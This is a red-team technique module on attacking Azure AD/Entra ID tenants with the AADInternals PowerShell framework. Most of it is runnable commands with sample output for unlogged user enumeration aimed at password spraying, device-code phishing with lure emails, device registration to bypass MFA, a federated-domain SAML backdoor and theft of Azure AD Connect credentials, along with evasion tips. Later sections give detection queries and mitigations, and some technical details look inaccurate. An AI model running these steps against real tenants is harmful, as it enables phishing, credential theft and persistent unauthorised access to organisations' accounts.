# REC-CLOUD-004: AADInternals Tenant Reconnaissance

## 1. MODULE METADATA

| Field | Value |
|-------|-------|
| **Module ID** | REC-CLOUD-004 |
| **Technique Name** | AADInternals tenant reconnaissance |
| **MITRE ATT&CK ID** | T1590.001 – Gather Victim Network Information: Domain Properties; T1087.004 – Account Discovery: Cloud Account |
| **CVE** | N/A (Legitimate security research framework) |
| **Platform** | Microsoft Entra ID / Azure AD / Office 365 |
| **Viability Status** | ACTIVE ✓ |
| **Difficulty to Detect** | HIGH (outsider recon uses public APIs; guest/insider enumeration unlogged) |
| **Requires Authentication** | No (outsider level); Yes for guest/insider levels |
| **Applicable Versions** | All Azure AD tenants, hybrid environments, Office 365 |
| **Last Verified** | December 2025 |
| **Tool Author** | Dr. Nestori Syynimaa (@DrAzureAD) |
| **Repository** | https://github.com/Gerenios/AADInternals |
| **Website** | https://aadinternals.com |
| **MITRE Software ID** | S0677 |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY

AADInternals is a comprehensive PowerShell-based framework for Azure Active Directory reconnaissance, administration, and exploitation that operates across three distinct access levels: outsider (unauthenticated public API reconnaissance), guest user (invited team member with read-only access), and insider (authenticated user with full directory access). Uniquely, AADInternals enables reconnaissance activities that range from completely undetectable (outsider enumeration) to unlogged internal discovery (guest user enumeration), making it exceptionally difficult to detect across the entire reconnaissance spectrum.

**Threat Profile:**
- **Outsider Level:** Requires zero credentials; uses only public Microsoft APIs (login.microsoftonline.com, autodiscover APIs, DNS)
- **Guest Level:** Leverages guest user access (Teams invite, SharePoint share) to enumerate entire tenant directory
- **Insider Level:** Full administrative reconnaissance with 20+ attack vectors (MFA disabling, device registration, federated domain backdoors, SAML token forging)

**Strategic Capabilities:**
- Tenant ID and domain structure discovery (no credentials required)
- User existence validation and enumeration via multiple methods
- Device registration for MFA bypass and persistence
- Federated domain trust backdoor creation (Global Admin level)
- SAML token forging using ADFS certificates
- Azure AD Connect Pass-Through Authentication (PTA) compromise via DLL injection
- Phishing infrastructure-less attack using device code flow
- OneDrive and mailbox exfiltration

**Business Impact:**
- Complete reconnaissance with zero detection risk (outsider level)
- Exposure of unregistered domains revealing product/service development pipelines
- User enumeration enabling targeted phishing campaigns
- Guest user access providing unexpected directory visibility
- Persistent backdoors via device registration or domain federation
- Compromise of hybrid identity infrastructure (PTA, ADFS)
- Unauthorized access to OneDrive and email via stolen tokens

---

## 3. TECHNICAL PREREQUISITES

### Required Knowledge
- Understanding of Azure AD/Entra ID tenant structure and API endpoints
- Familiarity with public Microsoft authentication APIs
- Knowledge of guest user permissions and limitations
- Awareness of federated authentication (ADFS, PTA)
- Understanding of SAML tokens and device code flow
- Basic PowerShell proficiency

### Required Tools
- **AADInternals PowerShell Module**
  - Installation: `Install-Module AADInternals` (from PSGallery)
  - Current version: 0.9.5+ (continuously updated)
  - Requirements: PowerShell 5.1+ (7+ recommended)
  - Repository: https://github.com/Gerenios/AADInternals
  - Website: https://aadinternals.com

- **System Requirements**
  - PowerShell execution capability (local or remote)
  - Outbound HTTPS access to Microsoft endpoints (login.microsoftonline.com, graph.microsoft.com)
  - No admin privileges required for outsider reconnaissance
  - Internet connectivity for all modes

- **Optional Components**
  - Azure AD Connect server access (for PTA exploitation)
  - ADFS server access (for SAML token forging)
  - Teams/SharePoint guest access (for guest-level reconnaissance)

---

## 4. DETAILED EXECUTION

### Method 1: Outsider Reconnaissance (Zero Credentials)

**Objective:** Enumerate Azure AD tenant information using only public APIs.

```powershell
# Install module
Install-Module AADInternals -Scope CurrentUser -Force

# Method 1A: Get tenant ID from domain
Get-AADIntTenantID -Domain "company.com"

# Output:
# TenantId: 05aea22e-32f3-4c35-831b-52735704feb3

# Method 1B: Get all tenant domains
Get-AADIntTenantDomains -Domain "company.com"

# Output shows all domains, auth type, MX records, SPF

# Method 1C: Get login information (tenant name, SSO status)
Get-AADIntLoginInformation -UserName "user@company.com"

# Output:
# Tenant Name: company
# Tenant Brand: Company Ltd
# Tenant ID: 05aea22e-32f3-4c35-831b-52735704feb3
# Desktop SSO enabled: True
# Password required: True

# Method 1D: Full outsider reconnaissance
Invoke-AADIntReconAsOutsider -DomainName "company.com"

# Output table showing:
# - Tenant brand and name
# - Desktop SSO status
# - All domains (verified + unverified)
# - Domain types (Federated vs Managed)
# - ADFS/STS server FQDN
# - MX and SPF records
```

**Key Findings from Outsider Recon:**
- **Unverified domains**: Reveal products/services under development
- **Federated domains**: Identify ADFS infrastructure for attacks
- **Desktop SSO enabled**: Enables user enumeration without authentication
- **Domain types**: Indicates hybrid vs. cloud-only configurations

---

### Method 2: User Enumeration (Three Methods)

**Objective:** Determine if target users exist in Azure AD.

```powershell
# Method 2A: Simple user existence check (logged)
Invoke-AADIntUserEnumerationAsOutsider -UserName "admin@company.com"

# Output:
# UserName Exists
# -------- ------
# admin@company.com True

# Method 2B: Bulk enumeration from wordlist (logged)
Get-Content .\users.txt | Invoke-AADIntUserEnumerationAsOutsider -Method Normal

# users.txt format:
# user1@company.com
# user2@company.com
# admin@company.com
# test@company.com

# Method 2C: Autologon enumeration (NOT LOGGED in sign-in logs)
Get-Content .\users.txt | Invoke-AADIntUserEnumerationAsOutsider -Method Autologon

# Key advantage: Autologon method queries are invisible
# Perfect for password spray without detection

# Method 2D: Login method enumeration
Get-Content .\users.txt | Invoke-AADIntUserEnumerationAsOutsider -Method Login

# Tries to log in as each user (LOGGED - use with caution)
```

**Detection Evasion:**
- **Autologon method**: Not logged in sign-in logs (safest for bulk enumeration)
- **Distributed enumeration**: Spread requests over time from multiple IPs
- **Normal user pattern**: Mix enumeration with legitimate login attempts

---

### Method 3: Guest User Reconnaissance

**Objective:** Enumerate Azure AD from guest user account (invited to Teams/SharePoint).

```powershell
# Prerequisites: Guest user invited to target tenant

# Step 1: Get access token for Azure Core Management (guest context)
Get-AADIntAccessTokenForAzureCoreManagement -SaveToCache

# Step 2: List available tenants (guest may have access to multiple)
Get-AADIntAzureTenants

# Output:
# Id: 6e3846ee-e8ca-4609-a3ab-f405cfbd02cd
# Name: Company Ltd
# Domains: {company.onmicrosoft.com, company.com, ...}

# Step 3: Get token for target tenant
Get-AADIntAccessTokenForAzureCoreManagement -Tenant 6e3846ee-e8ca-4609-a3ab-f405cfbd02cd -SaveToCache

# Step 4A: Full guest reconnaissance
$recon = Invoke-AADIntReconAsGuest

# Output shows:
# - Tenant brand/name
# - Domain information (ALL domains, even unverified)
# - Guest user's allowed actions (read/update permissions)
# - Number of Azure AD objects

# Step 4B: User enumeration via group relationships
$results = Invoke-AADIntUserEnumerationAsGuest -GroupMembers -Manager -Subordinates -Roles

# Returns users discovered through:
# - Group memberships
# - Manager relationships
# - Subordinates
# - Directory roles

# Step 4C: Extract specific user's groups
$results = Invoke-AADIntUserEnumerationAsGuest -UserName "user@company.com" -GroupMembers -Manager -Subordinates

# Key finding: Dynamic groups (all users, all guests) expose entire directory to guests!
```

**Guest User Capabilities (Despite Documentation):**
- Can read properties of any user (if ID known)
- Can list group members of any group (including admin groups!)
- Can identify "All Users" and "All Guests" dynamic groups
- Can discover external/contractor accounts in "All Guests" group
- Can identify manager-subordinate hierarchies
- Can identify directory roles (though not which role exactly)
- All enumeration is NOT logged

---

### Method 4: Insider Reconnaissance (Authenticated)

**Objective:** Full directory enumeration with authenticated user credentials.

```powershell
# Step 1: Authenticate as insider user
$username = "admin@company.com"
$password = ConvertTo-SecureString -String "Password123!" -AsPlainText -Force
$cred = New-Object PSCredential($username, $password)

# Step 2: Get access token
$token = Get-AADIntAccessTokenAsUser -UserName $username -Password $password -SaveToCache

# Step 3: Full insider reconnaissance
Invoke-AADIntReconAsInsider

# Step 4: Enumerate all users
Get-AADIntUsers | Select-Object displayName, userPrincipalName, accountEnabled, lastPasswordChangeDateTime

# Step 5: Enumerate all groups
Get-AADIntGroups | Select-Object displayName, id, members

# Step 6: Enumerate all roles
Get-AADIntRoles | Select-Object displayName, id, members

# Step 7: Enumerate all devices
Get-AADIntDevices | Select-Object displayName, id, deviceId, trustType

# Step 8: Enumerate all apps/SPs
Get-AADIntApplications | Select-Object displayName, appId, permissions

# Step 9: Enumerate conditional access policies
Get-AADIntConditionalAccessPolicies

# Step 10: Full export for offline analysis
Export-AADIntData -Path ./aad-export
```

---

### Method 5: Phishing via Device Code Flow

**Objective:** Compromise user credentials via infrastructure-less phishing.

```powershell
# Prerequisites: SMTP access to send emails

# Method 5A: Simple phishing email
$recipients = "victim@company.com", "victim2@company.com"
$message = "Your password is about to expire. <a href='{1}'>Click here to reset.</a> Code: {0}"

Invoke-AADIntPhishing -Recipients $recipients -Message $message -SaveToCache

# Output:
# Device code: CKDZ2BURF
# User visits: https://microsoft.com/devicelogin
# Enters code: CKDZ2BURF
# If approved: Token saved to cache
# Access to victim's email, OneDrive, Teams, etc.

# Method 5B: Phishing via Teams (less suspicious)
Invoke-AADIntPhishing -Recipients $recipients -Teams -CleanMessage "✓ Verified"

# Sends message via Teams, extracts tokens, replaces with verification check

# Method 5C: Custom message with branding
$message = @'
<img src="https://attacker.com/logo.png">
<p>Your account requires immediate action.</p>
<a href="{1}">Verify your account</a>
<p>Security Code: {0}</p>
'@

Invoke-AADIntPhishing -Recipients $recipients -Message $message -SMTPServer smtp.victim-mail.local -SaveToCache

# Key advantage: No phishing website required, uses legitimate Microsoft endpoints
```

---

### Method 6: Device Registration for MFA Bypass

**Objective:** Register attacker device to Azure AD for persistent MFA bypass.

```powershell
# Prerequisites: Valid user credentials (without MFA, or with MFA bypass)

# Step 1: Get access tokens for device registration
$tokens = Get-AADIntAccessTokenForDeviceRegistration -UserName "user@company.com" -Password "password"

# Step 2: Register device
Join-AADIntDeviceToAzureAD -Device "AttackerDevice" -Token $tokens

# Output:
# Device ID: 12345678-1234-1234-1234-123456789012
# Device name: AttackerDevice
# Device registered successfully

# Step 3: Authenticate using device claims
# Next time user logs in, device is trusted
# Device can authenticate without MFA
# Device persists for future access

# Step 4: Verify registration
Get-AADIntDevices | Where-Object displayName -eq "AttackerDevice"

# Output shows device registered and trusted
```

**Impact:**
- Persistent access even if password reset
- Bypasses MFA if device claims present
- Can be used for C2 infrastructure

---

### Method 7: Federated Domain Backdoor (Global Admin)

**Objective:** Convert managed domain to federated for persistent authentication bypass.

```powershell
# Prerequisites: Global Administrator role required

# Step 1: Get Azure AD Connect certificate
$cert = Get-AADIntAzureADConnectSyncCertificate

# Step 2: Convert domain to federated (creates backdoor)
Convert-AADIntDomainToFederated -DomainName "company.com" -Certificate $cert

# Step 3: Now attackers can forge SAML tokens
# Any email@company.com can authenticate using forged SAML
# MFA is bypassed
# On-premises knowledge not required

# Step 4: Generate SAML token for any user
$saml = New-AADIntSAMLToken -PrivateKey $key -IssuerName "https://sts.company.com/adfs/services/trust" -Subject "admin@company.com"

# Step 5: Use SAML token to access cloud services
# Office 365, SharePoint, Teams, etc. all trust the token
```

**Strategic Impact:**
- Permanent backdoor to entire cloud tenant
- Bypasses all MFA
- On-premises AD compromise unnecessary
- Can create new admin accounts without password reset

---

### Method 8: Steal Credentials from Azure AD Connect

**Objective:** Extract plaintext passwords from Azure AD Connect service account.

```powershell
# Prerequisites: Local admin access on Azure AD Connect server

# Method 8A: Dump LSA secrets (local passwords)
Get-AADIntLocalAdminPassword

# Returns passwords of accounts stored in LSA

# Method 8B: Extract Azure AD Connect credentials
Get-AADIntAzureADConnectSyncCredentials

# Returns:
# - Azure AD Connect sync account password
# - ADFS service account password (if configured)
# - Pass-Through Authentication (PTA) account password

# Method 8C: Export sync certificate
$cert = Get-AADIntAzureADConnectSyncCertificate
Export-AADIntCertificateToFile -Certificate $cert -Path ./sync-cert.pfx
```

---

## 5. TOOLS & COMMANDS REFERENCE

### AADInternals Function Matrix

| Function | Purpose | Access Level | Detection |
|----------|---------|--------------|-----------|
| `Get-AADIntTenantID` | Get tenant ID from domain | Outsider | None (public API) |
| `Get-AADIntTenantDomains` | List all tenant domains | Outsider | None |
| `Get-AADIntLoginInformation` | Get login details | Outsider | None |
| `Invoke-AADIntReconAsOutsider` | Full outsider recon | Outsider | None |
| `Invoke-AADIntUserEnumerationAsOutsider` | User existence check | Outsider | Logged (except autologon) |
| `Invoke-AADIntReconAsGuest` | Guest-level recon | Guest | Not logged |
| `Invoke-AADIntUserEnumerationAsGuest` | Guest user enumeration | Guest | Not logged |
| `Invoke-AADIntReconAsInsider` | Full insider recon | Insider | May be logged |
| `Invoke-AADIntPhishing` | Device code phishing | Outsider/Insider | Minimal |
| `Join-AADIntDeviceToAzureAD` | Register device | Insider | Audit log |
| `Convert-AADIntDomainToFederated` | Create federated backdoor | Global Admin | Audit log |
| `Get-AADIntAzureADConnectSyncCertificate` | Extract sync cert | Local Admin | None |
| `Set-AADIntUserMFA` | Disable user MFA | Admin | Audit log |
| `Get-AADIntAzureTenants` | List guest's tenants | Guest | Not logged |

---

## 6. ATOMIC TESTS

### Test 1: Outsider Reconnaissance

```powershell
$result = Invoke-AADIntReconAsOutsider -DomainName "test.com"
if ($result.tenantId) {
  Write-Host "✓ Test PASSED: Tenant ID enumerated"
  $result
} else {
  Write-Host "✗ Test FAILED"
}
```

### Test 2: User Enumeration

```powershell
$result = Invoke-AADIntUserEnumerationAsOutsider -UserName "admin@test.com"
if ($result.Exists -eq $true) {
  Write-Host "✓ Test PASSED: User exists"
} else {
  Write-Host "✗ Test FAILED or user doesn't exist"
}
```

### Test 3: Guest Access

```powershell
$result = Get-AADIntAzureTenants
if ($result.count -gt 0) {
  Write-Host "✓ Test PASSED: Guest has access to $($result.count) tenants"
} else {
  Write-Host "✗ Test FAILED: No guest access detected"
}
```

---

## 7. MICROSOFT SENTINEL DETECTION

### Detection Rule 1: Bulk User Enumeration (GetCredentialType)

```kusto
SigninLogs
| where TimeGenerated > ago(1h)
| where ResultType == "50058"  // MFA required or expired
| summarize Count = count() by UserPrincipalName, IPAddress, bin(TimeGenerated, 5m)
| where Count > 100  // Bulk enumeration threshold
| extend AlertSeverity = "High", TechniqueID = "T1590.001"
```

### Detection Rule 2: Device Registration Pattern

```kusto
AuditLogs
| where OperationName == "Register device"
| extend DeviceName = TargetResources[0].displayName
| summarize Count = count() by InitiatedByUserOrApp = InitiatedBy.user.userPrincipalName, bin(TimeGenerated, 1h)
| where Count > 5  // Unusual number of device registrations
| extend AlertSeverity = "High"
```

### Detection Rule 3: Domain Conversion (Managed to Federated)

```kusto
AuditLogs
| where OperationName == "Update domain"
| where tostring(AdditionalDetails) contains "Federated"
| extend AlertSeverity = "Critical", TechniqueID = "T1484.002"
```

---

## 8. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

**Restrict Guest User Access (Preview Feature)**
- **Impact:** Prevents guest enumeration of users/groups
- **Configuration:**
  1. Azure Portal → Entra ID → External identities → External collaboration settings
  2. Set "Guest user access restrictions" to "Limited"
  3. Prevents guest users from enumerating users/groups

**Do NOT Use Dynamic Groups for "All Users" or "All Guests"**
- Exposes entire directory to guests
- Remove: "All Company Users", "All Guests" dynamic groups
- Use explicit group assignments instead

**Enable MFA for Device Registration**
- **Configuration:**
  1. Entra ID → Security → Conditional Access
  2. Create policy: "Device Registration MFA"
  3. Target: Cloud app = "Device Registration Service"
  4. Grant: Require MFA
  5. Enable policy

**Restrict User Enumeration (Autologon)**
- Monitor for bulk GetCredentialType requests
- Block enumeration from external IPs
- Rate-limit enumeration attempts

### Priority 2: HIGH

**Restrict App Registrations**
- Disable self-service app registration
- Require admin approval for new apps

**Monitor Outsider Reconnaissance**
- Alert on public API enumeration (GetCredentialType)
- Baseline normal enumeration rates
- Block automated enumeration tools

**Audit Azure AD Connect**
- Restrict local admin access to Azure AD Connect server
- Monitor for credential extraction attempts
- Implement MFA for server access

**Enforce Conditional Access**
- Block or require MFA for Graph/ARM API access from external networks
- Require device compliance for sensitive operations

---

## 9. DETECTION & INCIDENT RESPONSE

### Forensic Artifact Collection

```powershell
# Collect sign-in logs showing GetCredentialType enumeration
Get-MgAuditLogSignIn -Filter "status/errorCode eq '50058'" | Export-Csv enum_logs.csv

# Collect device registration events
Get-MgAuditLogDirectoryAudit -Filter "operationName eq 'Register device'" | Export-Csv device_regs.csv

# Collect domain changes
Get-MgAuditLogDirectoryAudit -Filter "operationName eq 'Update domain'" | Export-Csv domain_changes.csv

# Check for registered devices
Get-MgDevice | Select-Object displayName, createdDateTime, approximateLastSignInDateTime
```

### Incident Response Steps

1. **Identify reconnaissance activity**
   - Check for bulk GetCredentialType calls
   - Correlate with IP address and time
   - Identify targeted users

2. **Assess scope**
   - Which users were enumerated
   - Which information accessed
   - Whether guest/insider access used

3. **Detect follow-on attacks**
   - Monitor for phishing against enumerated users
   - Check for device registrations post-reconnaissance
   - Monitor for privilege escalation attempts

4. **Containment**
   - Block attacker IP address
   - Force password reset for targeted users
   - Revoke suspicious device registrations
   - Monitor for backdoor creation (domain federation)

---

## 10. REAL-WORLD EXAMPLES

### Example: APT29 Device Registration Campaign (2021)

**Target:** Government and technology sectors  
**Method:** Compromised dormant account (no MFA) → Device registration → Persistent MFA bypass

**Attack Flow:**
1. Brute-forced dormant account (no MFA enforcement)
2. Registered attacker device to Azure AD
3. Device became trusted (device claims valid)
4. Subsequent logins from device bypassed MFA
5. Accessed Teams, OneDrive, Exchange mailboxes
6. Exfiltrated sensitive documents

**Detection Opportunities (Missed):**
- Device registration from unusual location
- Device registration post-credential compromise
- Unusual device usage patterns

---

## 11. COMPLIANCE MAPPING

| Standard | Requirement | AADInternals Mitigation |
|----------|-------------|------------------------|
| **NIST 800-53** | AC-2 (Account Management) | Restrict guest access; monitor enumeration |
| **DORA** | Identity service resilience | Implement CAP; enable MFA |
| **NIS2** | Detection capabilities | Baseline enumeration; alert on deviations |
| **ISO 27001** | 8.2 (Access control) | Guest restriction; CAP policies |

---

## 12. REFERENCES

1. **AADInternals Official:**
   - Website: https://aadinternals.com
   - GitHub: https://github.com/Gerenios/AADInternals
   - Author: Dr. Nestori Syynimaa

2. **MITRE ATT&CK:**
   - S0677 – AADInternals
   - T1590.001, T1087.004, T1098.005, T1484.002

3. **Real-World Campaigns:**
   - APT29 device registration (Oct 2021)
   - Storm-0501 Azure compromise (2022-2025)

---
